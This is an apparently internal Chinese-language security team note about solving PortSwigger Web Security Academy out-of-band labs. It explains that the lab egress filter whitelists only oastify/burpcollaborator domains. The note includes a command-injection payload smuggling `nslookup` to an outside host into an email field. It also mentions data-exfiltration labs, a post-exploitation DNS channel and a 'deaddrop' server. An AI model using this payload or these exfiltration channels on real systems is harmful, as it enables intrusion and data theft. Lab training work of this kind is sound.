---
title: prs_c2coe OOB Collaborator 判定真相
keywords: oob, collaborator, oastify, burpcollaborator, 盲打, 带外, 判定, blocked, 解锁
---

# OOB Collaborator 判定真相(两仓实证互补)

来源:prs_c2coe operations/business-logic-vulnerability/labs-workflow.md 坑节(98 号件实证)+
vuln-families/request-forgery-family.md SSRF 盲面行;与 pi-rs b19 判别器轮互补拼接。

## 判定真相(两半)

1. pi-rs 侧实证(b19 判别器):lab 出纤防火墙阻断任意外部交互-强制 8.8.8.8 与
   内置解析器对自有域(oob.dthack.io)双零 + 题面自述 => **仅放行 oastify /
   burpcollaborator 域**(Collaborator 官方域)。
2. prs_c2coe 侧实证(98 号件):**解题条件 = 打到 Collaborator 边即解**。随机子域
   (如 `prs-probe.oastify.com`)当 Referer/回调目标一发即解,**无需 Burp 客户端
   持有该子域**。

## 机制推演

判定在「查询/请求**到达** oastify/burpcollaborator 权威」层,不在「Burp 客户端
读到 interaction」层:随机编造的子域查询必达该权威(NXDOMAIN 应答也算到达)。
与我们 DNS 通道的「到达权威即投递」语义同构 [[oob-callback-family]]。

## 解锁面(4 题 blocked 再攻形)

载荷回调域换 `<随机串>.oastify.com`(或 burpcollaborator.net):
- /web-security/os-command-injection/lab-blind-out-of-band
- /web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
- /web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
- (同族任意 OOB 判定型)

验证状态:**已实证(批 53)**。检测面单点探针:`/feedback/submit` 的 email =
`x@a.com||nslookup b53p1a2b.oastify.com||`(随机子域、不持有)→ 8s 后横幅
`is-solved` + congrats。

但「一发即解」**只对检测型题成立**:外传型三题(OS 命令 whoami、Oracle 口令、
Shellshock 用户名)不翻——需自持 secret 派生标签再轮询读回,见
[[burp-collaborator-public-polling-method]];批 53 三题均以此收口。

## 机制精确化(批53 后)

「阻断任意外部交互」(b19 判词)过宽,真机制更窄:**域名级出纤白名单**——
同一 lab 实例同一载荷位,唯一变量 QNAME:oastify 出得去,自有域出不去;
自建链路本身健康(公网递归可达权威)。待钉死项:纯 DNS 白名单还是 HTTP
出纤也白名单(判别器:载荷查白名单外知名域)。

## 工作方式裁定(用户,2026-10-08)

**lab 面暂时用 oastify 替代自建回调**(burp_collab 件已支持 new/poll/list);
自建底座(oob_serve + oob.dthack.io)保留给真实授权目标场景与 postex DNS
通道的部署验证,不再作为 lab 解题回调面。

## 边界

- 仅限 lab 判定面:学院靶场的出纤白名单是判定机制,不是通用事实。
- 数据外传题随机子域不够(子域不可控即回读面缺)——**此项已被批 53 证伪**:
  自持 secret 派生的标签「可控且可轮询」,数据面拿得到([[burp-collaborator-public-polling-method]])。
- 真实授权目标的 OOB 仍需自有信道(pi-rs 两条腿:aws deaddrop 47.131.34.33 /
  cf_oob;见 [[oob-callback-family]])。
